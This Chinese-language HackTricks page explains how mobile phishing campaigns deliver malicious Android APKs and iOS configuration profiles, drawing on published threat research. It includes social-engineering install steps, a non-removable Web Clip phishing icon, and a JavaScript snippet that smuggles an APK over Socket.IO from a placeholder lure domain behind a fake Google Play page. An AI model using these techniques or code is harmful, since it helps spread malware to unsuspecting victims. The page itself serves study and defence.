# 移动钓鱼与恶意应用分发（Android 和 iOS）

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 本页介绍威胁行为者通过钓鱼（SEO、社会工程、虚假应用商店、交友应用等）分发**恶意 Android APK** 和 **iOS 移动配置描述文件**所使用的技术。
> 内容改编自 Zimperium zLabs 于 2025 年披露的 SarangTrap campaign 及其他公开研究。<sup>[[1]](#references)</sup>

## 攻击流程

1. **SEO/钓鱼基础设施**
   * 注册数十个相似域名（交友、云端分享、汽车服务……）。  
     – 在 `<title>` 元素中使用本地语言关键词和表情符号，以提高 Google 搜索排名。  
     – 在同一个落地页上同时托管 Android（`.apk`）和 iOS 安装说明。
2. **第一阶段下载**
   * Android：直接链接到*未签名*或“第三方应用商店”的 APK。  
   * iOS：使用 `itms-services://` 或普通 HTTPS 链接，指向恶意 **mobileconfig** 描述文件（见下文）。
3. **Android 安装后行为**
   * C2 控制的执行、权限滥用、dropper 绕过、后台收集及其他安装后恶意软件行为，请参阅下方专门介绍 Android 恶意软件 Post-Exploitation 的页面。
4. **iOS 投递技术**
   * 单个**移动配置描述文件**可以请求 `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` 等，以将设备注册为类似“MDM”的受监管设备。  
   * 社会工程诱导步骤：
     1. 打开“设置”➜ *已下载描述文件*。
     2. 连续点按三次 *安装*（钓鱼页面上附有截图）。  
     3. 信任未签名的描述文件 ➜ 攻击者无需经过 App Store 审核即可获得 *通讯录* 和 *照片* 权限。
5. **iOS Web Clip Payload（钓鱼应用图标）**
   * `com.apple.webClip.managed` payload 可以将**钓鱼 URL 固定到主屏幕**，并配上品牌图标和标签。
   * Web Clip 可以以**全屏**方式运行（隐藏浏览器界面），也可以设置为**不可移除**，迫使受害者删除描述文件才能移除图标。<sup>[[3]](#references)</sup>
6. **网络层**
   * 使用明文 HTTP，通常通过 80 端口，并设置类似 `api.<phishingdomain>.com` 的 HOST header。
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（无 TLS → 容易发现）。

## Android Malware Post-Exploitation

如需了解 Android 恶意软件安装后的技术手法，例如 C2、Accessibility 滥用、覆盖层、ATS 自动化、分阶段 DEX 加载、高级短信和持久化，请参阅：

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## 基于 Socket.IO/WebSocket 的 APK Smuggling + 虚假 Google Play 页面

攻击者越来越多地使用嵌入 Google Play 仿冒诱饵页面的 Socket.IO/WebSocket channel，取代静态 APK 链接。这样可以隐藏 payload URL、绕过 URL/扩展名过滤器，并保留逼真的安装体验。<sup>[[2]](#references)[[4]](#references)</sup>

在实际攻击中观察到的典型客户端流程：

<details>
<summary>Socket.IO 虚假 Play 下载器（JavaScript）</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

它为何能绕过简单的控制措施：
- 不会暴露静态 APK URL；payload 会根据 WebSocket 帧在内存中重建。
- 拦截直接返回 .apk 的 URL/MIME/扩展名过滤器，可能无法检测通过 WebSockets/Socket.IO 隧道传输的二进制数据。
- 不执行 WebSockets 的爬虫和 URL 沙箱无法获取 payload。

另请参阅 WebSocket tradecraft 和工具：

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [浪漫的阴暗面：SarangTrap 勒索活动](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple 设备的 Web Clips payload 设置](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [针对印度尼西亚和越南 Android 用户的 Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
